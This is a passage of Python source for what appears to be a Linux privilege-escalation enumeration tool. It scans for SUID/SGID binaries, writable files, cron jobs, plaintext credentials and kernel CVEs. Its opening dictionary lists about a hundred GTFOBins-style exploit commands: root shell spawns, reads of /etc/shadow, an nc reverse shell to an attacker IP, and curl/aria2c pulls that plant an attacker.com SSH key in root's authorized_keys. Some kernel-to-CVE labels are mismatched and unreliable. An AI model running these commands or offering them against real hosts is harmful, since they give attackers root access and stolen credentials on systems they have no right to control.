        exploitable_suid_binaries = {
        'nmap': '--interactive and !sh',
        'vim': '-c ":py import os; os.execl(\'/bin/sh\', \'sh\', \'-c\', \'reset; exec sh\')"',
        'find': '. -exec /bin/sh \\; -quit',
        'bash': '-p',
        'less': '!/bin/sh',
        'nano': '^R^X reset; sh 1>&0 2>&0',
        'cp': 'source_file /etc/shadow',
        'python': '-c \'import os; os.execl("/bin/sh", "sh", "-p")\'',
        
        # Additional GTFOBins entries
        'aria2c': '-d /root --allow-overwrite -o .ssh/authorized_keys "http://attacker.com/ssh-key"',
        'arp': '-v -f /etc/shadow',
        'ash': '-p',
        'awk': 'BEGIN {system("/bin/sh")}',
        'base64': '-d <<< "Y2F0IC9ldGMvc2hhZG93Cg=="', # Decodes to execute commands
        'busybox': 'sh -p',
        'chmod': '4755 /bin/bash',
        'chown': 'root:root /bin/bash',
        'csh': '-b',
        'curl': '-o /root/.ssh/authorized_keys http://attacker.com/ssh-key',
        'date': '-f /etc/shadow',
        'dd': 'if=/etc/shadow of=/dev/stdout',
        'dialog': '--textbox "/etc/shadow" 0 0',
        'diff': '/dev/null /etc/shadow',
        'docker': 'run -v /:/mnt --rm -it alpine chroot /mnt sh',
        'emacs': '-Q -nw --eval \'(term "/bin/sh -p")\'',
        'env': 'SUDO_ASKPASS=/bin/sh sudo -A',
        'expand': '/etc/shadow',
        'expect': '-c "spawn /bin/sh -p; interact"',
        'facter': '-p os.users.root.password_hash',
        'file': '--command /bin/sh',
        'flock': '-u / /bin/sh -p',
        'fmt': '/etc/shadow',
        'fold': '/etc/shadow',
        'gawk': 'BEGIN {system("/bin/sh")}',
        'gdb': '-nx -ex \'python import os; os.execl("/bin/sh", "sh", "-p")\' -ex quit',
        'gimp': '-idf --batch-interpreter=python-fu-eval -b \'import os; os.execl("/bin/sh", "sh", "-p")\'',
        'grep': '"" /etc/shadow',
        'head': '/etc/shadow',
        'ionice': '/bin/sh -p',
        'ip': 'netns add foo && ip netns exec foo /bin/sh -p && ip netns delete foo',
        'jjs': '-e "Java.type(\'java.lang.Runtime\').getRuntime().exec(\'/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p\',[\'/bin/sh\']);"',
        'jq': '-n \'system("/bin/sh")\'',
        'jrunscript': '-e "exec(\'/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p\')"',
        'ksh': '-p',
        'ld.so': '/bin/sh -p',
        'logsave': '/dev/null /bin/sh -i -p',
        'lua': '-e \'os.execute("/bin/sh")\'',
        'make': '-s --eval=$\'x:\\n\\t-\'"/bin/sh -p"',
        'mawk': 'BEGIN {system("/bin/sh")}',
        'more': '!/bin/sh',
        'mount': '-o bind /bin/bash /bin/mount && /bin/mount -p',
        'mysql': '-e "\\! /bin/sh"',
        'nc': '-e /bin/sh attackerip 4444',
        'nice': '/bin/sh -p',
        'nl': '/etc/shadow',
        'node': '-e \'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]});\'',
        'nohup': '/bin/sh -p -c "nohup /bin/sh -p </dev/tty >/dev/tty 2>/dev/tty"',
        'openssl': 'enc -in /etc/shadow -out /dev/stdout',
        'perl': '-e \'exec "/bin/sh";\'',
        'pg': '/etc/shadow',
        'php': '-r "system(\'/bin/sh\');"',
        'pico': '^R^X reset; sh 1>&0 2>&0',
        'pip': 'install --upgrade --force-reinstall --editable=`mktemp -d`',
        'puppet': 'apply -e "exec { \'/bin/sh -pc \\\\$@|sh\\\\${IFS}-p _ echo sh -p\': }"',
        'python2': '-c \'import os; os.execl("/bin/sh", "sh", "-p")\'',
        'python3': '-c \'import os; os.execl("/bin/sh", "sh", "-p")\'',
        'rlwrap': '-H /dev/null /bin/sh -p',
        'rsync': '-e \'sh -p -c "sh 0<&2 1>&2"\' 127.0.0.1:/',
        'ruby': '-e \'exec "/bin/sh"\'',
        'run-parts': '--new-session --regex \'^sh$\' /bin --arg=\'-p\'',
        'rview': '-c \':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\'',
        'rvim': '-c \':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\'',
        'sed': '-i\'s/x/y/e\' /etc/shadow',
        'setarch': '$(arch) /bin/sh -p',
        'socat': 'FILE:`tty`,raw,echo=0 EXEC:"sh -p",pty,stderr,setsid,sigint,sane',
        'sqlite3': '\'.shell /bin/sh -p\'',
        'stdbuf': '-i0 /bin/sh -p',
        'strace': '-o /dev/null /bin/sh -p',
        'systemctl': 'link /bin/sh /tmp/systemctl && /tmp/systemctl',
        'tail': '/etc/shadow',
        'tar': '-cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh',
        'taskset': '1 /bin/sh -p',
        'tclsh': 'exec /bin/sh -p <@stdin >@stdout 2>@stderr',
        'time': '/bin/sh -p',
        'timeout': '7d /bin/sh -p',
        'ul': '/etc/shadow',
        'unexpand': '/etc/shadow',
        'uniq': '/etc/shadow',
        'unshare': '-r /bin/sh',
        'view': '-c \':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\'',
        'vigr': '',  # Just running it gives elevated access to /etc/group
        'vim': '-c \':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\'',
        'vimdiff': '-c \':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\'',
        'vipw': '',  # Just running it gives elevated access to /etc/passwd
        'watch': '-x sh -c \'reset; exec sh 1>&0 2>&0\'',
        'wget': '--use-askpass=/bin/sh',
        'xargs': '-a /dev/null sh -p',
        'xxd': '/etc/shadow | xxd -r',
        'zsh': '',
        'zip': '-q /tmp/test.zip . -T -TT \'sh #\'',
        'zsoelim': '/etc/shadow'
    }
    
        # Use multiple threads to scan the filesystem faster
        paths_to_scan = []
        for root, dirs, files in os.walk('/', topdown=True):
            dirs[:] = [d for d in dirs if os.path.join(root, d) not in self.exclude_paths]
            for name in files:
                path = os.path.join(root, name)
                paths_to_scan.append(path)
        
        def check_suid(path):
            try:
                if os.access(path, os.F_OK) and os.access(path, os.X_OK):
                    file_stat = os.stat(path)
                    if file_stat.st_mode & stat.S_ISUID:
                        binary_name = os.path.basename(path)
                        exploit_method = exploitable_suid_binaries.get(binary_name, "")
                        
                        # Get ownership information
                        try:
                            owner = pwd.getpwuid(file_stat.st_uid).pw_name
                        except:
                            owner = str(file_stat.st_uid)
                        
                        try:
                            group = grp.getgrgid(file_stat.st_gid).gr_name
                        except:
                            group = str(file_stat.st_gid)
                        
                        # Verify if the binary is exploitable by the current user
                        is_exploitable = False
                        if os.access(path, os.X_OK):
                            try:
                                # Check if it's actually executable by trying to run a safe version check
                                # Don't run the actual exploit during scanning
                                binary_name = os.path.basename(path)
                                
                                if binary_name in exploitable_suid_binaries:
                                    # For known exploitable binaries, verify by checking version or help
                                    with open(os.devnull, 'w') as devnull:
                                        if binary_name in ['nmap', 'vim', 'nano', 'less', 'more']:
                                            # These typically support --version
                                            try:
                                                subprocess.run([path, "--version"], stdout=devnull, stderr=devnull, timeout=0.5)
                                                is_exploitable = True
                                            except:
                                                # Try --help if version failed
                                                try:
                                                    subprocess.run([path, "--help"], stdout=devnull, stderr=devnull, timeout=0.5)
                                                    is_exploitable = True
                                                except:
                                                    # Just check if it's accessible
                                                    if os.access(path, os.X_OK):
                                                        is_exploitable = True
                                        elif binary_name == 'find':
                                            # Find has a different syntax for help
                                            try:
                                                subprocess.run([path, "-version"], stdout=devnull, stderr=devnull, timeout=0.5)
                                                is_exploitable = True
                                            except:
                                                is_exploitable = True  # Find is almost always exploitable if it's executable
                                        elif binary_name in ['bash', 'sh', 'ksh', 'zsh']:
                                            # Shells are always exploitable if executable
                                            is_exploitable = True
                                        elif binary_name in ['python', 'perl', 'ruby', 'php']:
                                            # Scripting languages are always exploitable if executable
                                            is_exploitable = True
                                        else:
                                            # For other binaries, just check if they're executable
                                            is_exploitable = True
                                else:
                                    # For unknown binaries, check against a list of potentially exploitable types
                                    known_exploitable = ['cp', 'mv', 'awk', 'sed', 'tar', 'wget', 'curl', 'rsync', 'socat', 'gdb']
                                    if binary_name in known_exploitable:
                                        is_exploitable = True
                                    # Else it's not exploitable
                            except Exception as e:
                                self.logger.log(LogLevel.DEBUG, f"Error verifying exploitability of {path}: {e}")
                                # Any error means we probably can't exploit it properly
                                is_exploitable = False
                        
                        vuln = {
                            'type': 'suid_binary',
                            'path': path,
                            'owner': owner,
                            'group': group,
                            'permissions': oct(file_stat.st_mode)[-4:],
                            'exploit_method': exploit_method,
                            'is_exploitable': is_exploitable
                        }
                        
                        if exploit_method and is_exploitable:
                            self.logger.log(LogLevel.SUCCESS, f"Found exploitable SUID binary: {path}")
                            self.logger.log(LogLevel.INFO, f"  Exploit Method: {binary_name} {exploit_method}")
                            self.logger.log(LogLevel.SUCCESS, f"  Verified as executable by current user")
                        elif is_exploitable:
                            self.logger.log(LogLevel.INFO, f"Found potentially exploitable SUID binary: {path}")
                        else:
                            self.logger.log(LogLevel.INFO, f"Found SUID binary: {path}")
                        
                        self.vulnerabilities.append(vuln)
                        return True
            except Exception as e:
                self.logger.log(LogLevel.DEBUG, f"Error checking SUID for {path}: {e}")
            return False
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            results = list(executor.map(check_suid, paths_to_scan))
        
        self.logger.log(LogLevel.INFO, f"Found {sum(results)} SUID binaries")
    
    def scan_sgid_binaries(self):
        """Scan for SGID binaries that can be exploited with verification"""
        self.logger.log(LogLevel.INFO, "Scanning for SGID binaries...")
        sgid_binaries = []
        
        # Use multiple threads to scan the filesystem faster
        paths_to_scan = []
        for root, dirs, files in os.walk('/', topdown=True):
            dirs[:] = [d for d in dirs if os.path.join(root, d) not in self.exclude_paths]
            for name in files:
                path = os.path.join(root, name)
                paths_to_scan.append(path)
        
        def check_sgid(path):
            try:
                if os.access(path, os.F_OK) and os.access(path, os.X_OK):
                    file_stat = os.stat(path)
                    if file_stat.st_mode & stat.S_ISGID:
                        binary_name = os.path.basename(path)
                        
                        # Get ownership information
                        try:
                            owner = pwd.getpwuid(file_stat.st_uid).pw_name
                        except:
                            owner = str(file_stat.st_uid)
                        
                        try:
                            group = grp.getgrgid(file_stat.st_gid).gr_name
                        except:
                            group = str(file_stat.st_gid)
                        
                        # Verify if the binary is exploitable
                        is_exploitable = False
                        
                        # Check if the group is interesting for privilege escalation
                        interesting_groups = ['shadow', 'docker', 'disk', 'admin', 'wheel', 'staff', 'sudo']
                        if group in interesting_groups:
                            is_exploitable = True
                        
                        # Check if the binary name suggests it's useful for privilege escalation
                        interesting_binaries = ['vim', 'nano', 'cp', 'find', 'ssh-agent', 'crontab']
                        if binary_name in interesting_binaries:
                            is_exploitable = True
                        
                        vuln = {
                            'type': 'sgid_binary',
                            'path': path,
                            'owner': owner,
                            'group': group,
                            'permissions': oct(file_stat.st_mode)[-4:],
                            'is_exploitable': is_exploitable
                        }
                        
                        if is_exploitable:
                            self.logger.log(LogLevel.SUCCESS, f"Found potentially exploitable SGID binary: {path}")
                            self.logger.log(LogLevel.INFO, f"  Group: {group}")
                        else:
                            self.logger.log(LogLevel.INFO, f"Found SGID binary: {path}")
                        
                        self.vulnerabilities.append(vuln)
                        return True
                return False
            except Exception as e:
                self.logger.log(LogLevel.DEBUG, f"Error checking SGID for {path}: {e}")
                return False
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            results = list(executor.map(check_sgid, paths_to_scan))
        
        self.logger.log(LogLevel.INFO, f"Found {sum(results)} SGID binaries")
        
    def scan_writable_files(self):
        """Scan for writable files owned by root or other privileged users"""
        self.logger.log(LogLevel.INFO, "Scanning for writable files owned by privileged users...")
        
        # Critical system files that are interesting targets
        critical_files = [
            '/etc/passwd', '/etc/shadow', '/etc/sudoers', '/etc/ssh/sshd_config',
            '/etc/crontab', '/etc/cron.d/', '/etc/cron.daily/', '/etc/cron.hourly/',
            '/etc/cron.monthly/', '/etc/cron.weekly/', '/etc/init.d/', '/etc/rc.d/',
            '/etc/profile', '/etc/bash.bashrc', '/root/.bashrc', '/root/.bash_profile'
        ]
        
        writable_files = []
        
        def check_file_writable(path):
            try:
                if os.path.isfile(path) and os.access(path, os.W_OK):
                    # Verify that we can actually write to the file
                    try:
                        # Try to open the file in append mode to verify write access
                        with open(path, 'a') as f:
                            # Don't actually write anything, just check if we can open it for writing
                            pass
                    
                        file_stat = os.stat(path)
                    
                        # Check if owned by root or system user (UID < 1000)
                        if file_stat.st_uid < 1000:
                            try:
                                owner = pwd.getpwuid(file_stat.st_uid).pw_name
                            except:
                                owner = str(file_stat.st_uid)
                        
                            try:
                                group = grp.getgrgid(file_stat.st_gid).gr_name
                            except:
                                group = str(file_stat.st_gid)
                        
                            vuln = {
                                'type': 'writable_file',
                                'path': path,
                                'owner': owner,
                                'group': group,
                                'permissions': oct(file_stat.st_mode)[-4:],
                                'is_critical': any(path.startswith(crit) for crit in critical_files),
                                'is_exploitable': True
                            }
                        
                            if vuln['is_critical']:
                                self.logger.log(LogLevel.SUCCESS, f"Found writable CRITICAL file: {path}")
                            else:
                                self.logger.log(LogLevel.INFO, f"Found writable file owned by {owner}: {path}")
                        
                            self.logger.log(LogLevel.SUCCESS, f"  Verified as writable by current user")
                            self.vulnerabilities.append(vuln)
                            return True
                    except (IOError, PermissionError):
                        # The OS reported it's writable but we couldn't actually write to it
                        self.logger.log(LogLevel.DEBUG, f"File {path} appears writable but write attempt failed")
                        return False
            except Exception as e:
                self.logger.log(LogLevel.DEBUG, f"Error checking writable file {path}: {e}")
            return False
        
        # First check the critical files
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            critical_paths = [path for path in critical_files if os.path.exists(path)]
            critical_results = list(executor.map(check_file_writable, critical_paths))
            
        # Then check other locations
        paths_to_scan = []
        for root, dirs, files in os.walk('/', topdown=True):
            dirs[:] = [d for d in dirs if os.path.join(root, d) not in self.exclude_paths]
            for name in files:
                path = os.path.join(root, name)
                paths_to_scan.append(path)
        
        # Sample a subset of paths to avoid excessive scanning
        import random
        sample_size = min(10000, len(paths_to_scan))
        sampled_paths = random.sample(paths_to_scan, sample_size)
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            general_results = list(executor.map(check_file_writable, sampled_paths))
        
        self.logger.log(LogLevel.INFO, f"Found {sum(critical_results) + sum(general_results)} writable privileged files")
    
    def scan_world_writable_directories(self):
        """Scan for world-writable directories"""
        self.logger.log(LogLevel.INFO, "Scanning for world-writable directories...")
        
        world_writable_dirs = []
        
        # Critical system directories that are interesting targets
        critical_dirs = [
            '/etc', '/bin', '/sbin', '/usr/bin', '/usr/sbin', '/usr/local/bin',
            '/usr/local/sbin', '/lib', '/lib64', '/usr/lib', '/usr/lib64',
            '/var/www', '/var/mail', '/var/spool', '/opt'
        ]
        
        def check_dir_writable(path):
            try:
                if os.path.isdir(path) and os.access(path, os.W_OK) and os.access(path, os.X_OK):
                    dir_stat = os.stat(path)
                    
                    # Get ownership information
                    try:
                        owner = pwd.getpwuid(dir_stat.st_uid).pw_name
                    except:
                        owner = str(dir_stat.st_uid)
                    
                    try:
                        group = grp.getgrgid(dir_stat.st_gid).gr_name
                    except:
                        group = str(dir_stat.st_gid)
                    
                    # Check if it's world-writable (permission ends with 7 or 2)
                    perms = oct(dir_stat.st_mode)[-1]
                    if perms in ['7', '2']:
                        vuln = {
                            'type': 'world_writable_directory',
                            'path': path,
                            'owner': owner,
                            'group': group,
                            'permissions': oct(dir_stat.st_mode)[-4:],
                            'is_critical': any(path.startswith(crit) for crit in critical_dirs)
                        }
                        
                        if vuln['is_critical']:
                            self.logger.log(LogLevel.SUCCESS, f"Found world-writable CRITICAL directory: {path}")
                        else:
                            self.logger.log(LogLevel.INFO, f"Found world-writable directory: {path}")
                        
                        self.vulnerabilities.append(vuln)
                        return True
            except Exception as e:
                self.logger.log(LogLevel.DEBUG, f"Error checking writable directory {path}: {e}")
            return False
        
        # First check the critical directories
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            critical_paths = [path for path in critical_dirs if os.path.exists(path)]
            critical_results = list(executor.map(check_dir_writable, critical_paths))
        
        # Then check other locations
        paths_to_scan = []
        for root, dirs, _ in os.walk('/', topdown=True):
            dirs[:] = [d for d in dirs if os.path.join(root, d) not in self.exclude_paths]
            for name in dirs:
                path = os.path.join(root, name)
                paths_to_scan.append(path)
        
        # Sample a subset of paths to avoid excessive scanning
        import random
        sample_size = min(5000, len(paths_to_scan))
        sampled_paths = random.sample(paths_to_scan, sample_size)
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            general_results = list(executor.map(check_dir_writable, sampled_paths))
        
        self.logger.log(LogLevel.INFO, f"Found {sum(critical_results) + sum(general_results)} world-writable directories")
    
    def scan_weak_file_permissions(self):
        """Scan for weak file permissions on critical files"""
        self.logger.log(LogLevel.INFO, "Scanning for weak file permissions on critical files...")
        
        critical_files = {
            '/etc/shadow': {'expected_perms': '0640', 'expected_owner': 'root'},
            '/etc/passwd': {'expected_perms': '0644', 'expected_owner': 'root'},
            '/etc/sudoers': {'expected_perms': '0440', 'expected_owner': 'root'},
            '/etc/ssh/sshd_config': {'expected_perms': '0600', 'expected_owner': 'root'},
            '/etc/crontab': {'expected_perms': '0644', 'expected_owner': 'root'},
            '/etc/hosts.allow': {'expected_perms': '0644', 'expected_owner': 'root'},
            '/etc/hosts.deny': {'expected_perms': '0644', 'expected_owner': 'root'},
            '/etc/resolv.conf': {'expected_perms': '0644', 'expected_owner': 'root'},
            '/etc/motd': {'expected_perms': '0644', 'expected_owner': 'root'},
            '/etc/issue': {'expected_perms': '0644', 'expected_owner': 'root'},
            '/etc/issue.net': {'expected_perms': '0644', 'expected_owner': 'root'},
            '/root/.bashrc': {'expected_perms': '0600', 'expected_owner': 'root'},
            '/root/.bash_profile': {'expected_perms': '0600', 'expected_owner': 'root'},
            '/root/.ssh/authorized_keys': {'expected_perms': '0600', 'expected_owner': 'root'},
            '/var/log/auth.log': {'expected_perms': '0640', 'expected_owner': 'root'},
            '/var/log/syslog': {'expected_perms': '0640', 'expected_owner': 'root'}
        }
        
        for path, expected in critical_files.items():
            try:
                if os.path.exists(path):
                    file_stat = os.stat(path)
                    file_perms = oct(file_stat.st_mode)[-4:]
                
                    # Get ownership information
                    try:
                        owner = pwd.getpwuid(file_stat.st_uid).pw_name
                    except:
                        owner = str(file_stat.st_uid)
                
                    try:
                        group = grp.getgrgid(file_stat.st_gid).gr_name
                    except:
                        group = str(file_stat.st_gid)
                
                    # Check if permissions are weaker than expected AND file is writable by current user
                    if (file_perms != expected['expected_perms'] or owner != expected['expected_owner']) and os.access(path, os.W_OK):
                        vuln = {
                            'type': 'weak_file_permissions',
                            'path': path,
                            'current_owner': owner,
                            'current_group': group,
                            'current_permissions': file_perms,
                            'expected_permissions': expected['expected_perms'],
                            'expected_owner': expected['expected_owner'],
                            'is_exploitable': True
                        }
                    
                        self.logger.log(LogLevel.SUCCESS, f"Found weak permissions on critical file: {path}")
                        self.logger.log(LogLevel.INFO, f"  Current: {owner}:{group} {file_perms}, Expected: {expected['expected_owner']} {expected['expected_perms']}")
                        self.logger.log(LogLevel.SUCCESS, f"  Verified as writable by current user")
                    
                        self.vulnerabilities.append(vuln)
            except Exception as e:
                self.logger.log(LogLevel.DEBUG, f"Error checking permissions for {path}: {e}")
    
    def scan_docker_group(self):
        """Check if current user is in docker group (which can lead to privilege escalation)"""
        self.logger.log(LogLevel.INFO, "Checking for Docker group membership...")
        
        try:
            groups = [g.gr_name for g in grp.getgrall()]
            if 'docker' in groups:
                current_user = os.getlogin()
                docker_group = grp.getgrnam('docker')
                
                if current_user in docker_group.gr_mem:
                    vuln = {
                        'type': 'docker_group_member',
                        'user': current_user,
                        'group': 'docker'
                    }
                    
                    self.logger.log(LogLevel.SUCCESS, f"User {current_user} is a member of the docker group")
                    self.logger.log(LogLevel.INFO, "  This can be exploited to gain root privileges")
                    
                    self.vulnerabilities.append(vuln)
        except Exception as e:
            self.logger.log(LogLevel.DEBUG, f"Error checking docker group: {e}")
    
    def scan_weak_credentials(self):
        """Scan for weak credentials in configuration files"""
        self.logger.log(LogLevel.INFO, "Scanning for plaintext credentials in configuration files...")
        
        # Define credential patterns to search for
        self.config_patterns = [
            r'(?i)password\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?',
            r'(?i)passwd\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?',
            r'(?i)pwd\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?',
            r'(?i)username\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?',
            r'(?i)user\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?',
            r'(?i)database_password\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?',
            r'(?i)db_password\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?',
            r'(?i)api[_\s]key\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?',
            r'(?i)secret[_\s]key\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?',
            r'(?i)access[_\s]key\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?',
            r'(?i)auth[_\s]token\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?'
        ]
        
        # Look for configuration files in common locations
        config_locations = [
            '/etc/',
            '/var/www/',
            '/opt/',
            '/home/',
            '/usr/local/etc/',
            '/usr/local/bin/',
            '/var/lib/',
            '/srv/'
        ]
        
        config_extensions = ['.conf', '.config', '.cfg', '.ini', '.yml', '.yaml', '.xml', '.json', '.env', '.properties']
        
        # Check if we can read /etc/shadow for easy privilege escalation
        try:
            if os.access('/etc/shadow', os.R_OK):
                vuln = {
                    'type': 'readable_shadow_file',
                    'path': '/etc/shadow',
                    'is_exploitable': True
                }
                self.logger.log(LogLevel.SUCCESS, "The /etc/shadow file is readable!")
                self.vulnerabilities.append(vuln)
        except Exception as e:
            self.logger.log(LogLevel.DEBUG, f"Error checking /etc/shadow: {e}")
        
        # Find configuration files
        config_files = []
        for location in config_locations:
            try:
                for root, dirs, files in os.walk(location, topdown=True):
                    dirs[:] = [d for d in dirs if os.path.join(root, d) not in self.exclude_paths]
                    for file in files:
                        if any(file.endswith(ext) for ext in config_extensions):
                            config_files.append(os.path.join(root, file))
            except Exception as e:
                self.logger.log(LogLevel.DEBUG, f"Error walking directory {location}: {e}")
        
        # Sample a subset of files to avoid excessive scanning
        import random
        sample_size = min(1000, len(config_files))
        sampled_files = random.sample(config_files, sample_size) if config_files else []
        
        # Define the inner function
        def check_file_for_credentials(file_path):
            try:
                if os.access(file_path, os.R_OK):
                    with open(file_path, 'r', errors='ignore') as f:
                        # Read only first 1000 characters to avoid large files
                        content = f.read(1000)
                        
                    found_creds = False
                    creds_data = []
                    
                    for pattern in self.config_patterns:
                        matches = re.findall(pattern, content)
                        if matches:
                            # Filter out obvious non-credentials
                            non_creds = ['username', 'user', 'password', 'passwd', '<username>', '<password>', 
                                        'example', 'test', 'default', 'placeholder', 'your_password',
                                        '0', '1', 'true', 'false', 'null', 'none', 'not yet implemented']
                            
                            real_matches = []
                            for match in matches[:3]:  # Limit to 3 matches per file
                                if (match and 
                                    len(match) > 3 and 
                                    match.lower() not in non_creds and
                                    not any(nc.lower() in match.lower() for nc in non_creds)):
                                    real_matches.append(match)
                            
                            if real_matches:
                                found_creds = True
                                creds_data.append({'pattern': pattern, 'matches': real_matches})
                    
                    if found_creds:
                        vuln = {
                            'type': 'plaintext_credentials',
                            'path': file_path,
                            'pattern': creds_data[0]['pattern'],  # For backward compatibility
                            'matches': creds_data[0]['matches'],  # For backward compatibility
                            'creds_data': creds_data,
                            'is_exploitable': True  # These are always potentially exploitable
                        }
                        
                        self.logger.log(LogLevel.SUCCESS, f"Found potential credentials in: {file_path}")
                        for data in creds_data:
                            for match in data['matches']:
                                self.logger.log(LogLevel.INFO, f"  Match: {match}")
                        
                        self.vulnerabilities.append(vuln)
                        return True
            except Exception as e:
                self.logger.log(LogLevel.DEBUG, f"Error checking file {file_path}: {e}")
            return False
        
        # Use ThreadPoolExecutor to scan files in parallel - this should be inside scan_weak_credentials
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            results = list(executor.map(check_file_for_credentials, sampled_files))
        
        self.logger.log(LogLevel.INFO, f"Found {sum(results) if results else 0} files with potential plaintext credentials")
    
    def scan_kernel_exploits(self):
        """Check for known kernel vulnerabilities"""
        self.logger.log(LogLevel.INFO, "Checking for kernel vulnerabilities...")
        
        # Get kernel version
        try:
            kernel_version_full = platform.release()
            kernel_version = re.search(r'^(\d+\.\d+\.\d+)', kernel_version_full)
            if kernel_version:
                kernel_version = kernel_version.group(1)
            else:
                kernel_version = kernel_version_full
                
            self.logger.log(LogLevel.INFO, f"Kernel version: {kernel_version}")
            
            # Known vulnerable kernel versions and their exploits
            kernel_exploits = {
                # Format: 'kernel_version_regex': {'name': 'exploit_name', 'cve': 'CVE-ID', 'description': 'description'}
                r'2\.6\.(9|10|13|14|15|16|17|18|19|20|21|22|23|24|25|26|27|28|29|30|31|32|33|34|35|36|37|38|39)': {
                    'name': 'CVE-2009-2698 / Dirty COW',
                    'cve': 'CVE-2009-2698',
                    'description': 'sock_sendpage() privilege escalation'
                },
                r'2\.6\.(39)|3\.(0|1|2|3|4|5|6|7|8|9|10|11|12|13|14|15|16|17|18|19|20|21|22|23|24|25|26|27|28|29|30|31|32|33|34|35|36|37|38|39|40|41|42|43|44|45|46|47|48|49|50|51|52|53|54|55|56|57|58|59|60|61|62|63|64|65|66|67|68|69|70|71|72|73|74|75|76|77|78|79|80|81|82|83|84|85|86|87|88|89|90|91|92|93|94|95|96|97|98|99)': {
                    'name': 'CVE-2016-5195 / Dirty COW',
                    'cve': 'CVE-2016-5195',
                    'description': 'Race condition in the Linux kernel memory subsystem'
                },
                r'2\.6\.(22|23|24|25|26|27|28|29|30|31|32|33|34|35|36|37|38|39)|3\.(0|1|2|3|4|5|6|7|8)': {
                    'name': 'CVE-2012-0056 / Mempodipper',
                    'cve': 'CVE-2012-0056',
                    'description': '/proc/pid/mem privilege escalation'
                },
                r'3\.(13|14|15|16|17|18)': {
                    'name': 'CVE-2015-1328 / overlayfs',
                    'cve': 'CVE-2015-1328',
                    'description': 'overlayfs incorrect permission handling'
                },
                r'4\.(3|4|5|6|7|8|9|10|11|12|13|14|15|16|17|18|19|20)': {
                    'name': 'CVE-2017-16995 / kernel exploit',
                    'cve': 'CVE-2017-16995',
                    'description': 'Linux kernel privilege escalation vulnerability'
                },
                r'4\.(4|5|6|7|8|9|10|11|12|13|14|15|16|17)': {
                    'name': 'CVE-2017-1000112 / CVE-2017-1000112',
                    'cve': 'CVE-2017-1000112',
                    'description': 'Vulnerability in XFRM framework in Linux kernel'
                },
                r'4\.(8|9|10|11|12|13|14|15|16)': {
                    'name': 'CVE-2017-7308 / packet_set_ring',
                    'cve': 'CVE-2017-7308',
                    'description': 'Integer overflow in packet_set_ring in Linux kernel'
                },
                r'5\.(0|1|2|3|4|5|6|7|8|9|10|11|12|13|14|15|16|17|18|19|20|21|22|23|24|25|26|27|28|29|30|31|32)': {
                    'name': 'CVE-2022-2586 / nft_object UAF',
                    'cve': 'CVE-2022-2586',
                    'description': 'Use-after-free vulnerability in net/netfilter/nf_tables_api.c'
                }
            }
            
            for kernel_regex, exploit in kernel_exploits.items():
                if re.match(kernel_regex, kernel_version):
                    vuln = {
                        'type': 'kernel_exploit',
                        'kernel_version': kernel_version,
                        'exploit_name': exploit['name'],
                        'cve': exploit['cve'],
                        'description': exploit['description']
                    }
                    
                    self.logger.log(LogLevel.SUCCESS, f"Kernel {kernel_version} is vulnerable to {exploit['name']} ({exploit['cve']})")
                    self.logger.log(LogLevel.INFO, f"  Description: {exploit['description']}")
                    
                    self.vulnerabilities.append(vuln)
                    
        except Exception as e:
            self.logger.log(LogLevel.ERROR, f"Error checking kernel exploits: {e}")
    
    def scan_scheduled_tasks(self):
        """Scan for writable cron jobs and systemd timers"""
        self.logger.log(LogLevel.INFO, "Scanning for writable scheduled tasks...")
        
        # Check crontab
        cron_locations = [
            '/etc/crontab',
            '/etc/cron.d/',
            '/etc/cron.daily/',
            '/etc/cron.hourly/',
            '/etc/cron.monthly/',
            '/etc/cron.weekly/',
            '/var/spool/cron/'
        ]
        
        for location in cron_locations:
            try:
                if os.path.isdir(location):
                    for root, dirs, files in os.walk(location):
                        for file in files:
                            file_path = os.path.join(root, file)
                            if os.access(file_path, os.W_OK):
                                file_stat = os.stat(file_path)
                                
                                # Get ownership information
                                try:
                                    owner = pwd.getpwuid(file_stat.st_uid).pw_name
                                except:
                                    owner = str(file_stat.st_uid)
                                
                                try:
                                    group = grp.getgrgid(file_stat.st_gid).gr_name
                                except:
                                    group = str(file_stat.st_gid)
                                
                                vuln = {
                                    'type': 'writable_cron_job',
                                    'path': file_path,
                                    'owner': owner,
                                    'group': group,
                                    'permissions': oct(file_stat.st_mode)[-4:]
                                }
                                
                                self.logger.log(LogLevel.SUCCESS, f"Found writable cron job: {file_path}")
                                self.vulnerabilities.append(vuln)
                
                elif os.path.isfile(location) and os.access(location, os.W_OK):
                    file_stat = os.stat(location)
                    
                    # Get ownership information
                    try:
                        owner = pwd.getpwuid(file_stat.st_uid).pw_name
                    except:
                        owner = str(file_stat.st_uid)
                    
                    try:
                        group = grp.getgrgid(file_stat.st_gid).gr_name
                    except:
                        group = str(file_stat.st_gid)
                    
                    vuln = {
                        'type': 'writable_cron_file',
                        'path': location,
                        'owner': owner,
                        'group': group,
                        'permissions': oct(file_stat.st_mode)[-4:]
                    }
                    
                    self.logger.log(LogLevel.SUCCESS, f"Found writable cron file: {location}")
                    self.vulnerabilities.append(vuln)
            
            except Exception as e:
                self.logger.log(LogLevel.DEBUG, f"Error checking cron location {location}: {e}")
        
